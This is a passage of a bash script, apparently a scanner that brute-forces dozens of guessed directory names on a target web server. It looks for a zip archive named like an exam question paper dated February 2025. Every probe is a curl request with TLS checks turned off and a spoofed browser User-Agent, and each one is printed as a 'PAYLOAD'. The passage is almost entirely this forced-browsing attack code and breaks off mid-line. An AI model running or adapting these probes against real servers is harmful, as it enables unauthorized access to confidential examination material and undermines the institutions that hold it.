payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceFileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBManagement/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PPanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileFileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TransferQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TransferQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TransferQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminDatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TransferQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TransferQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TransferQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
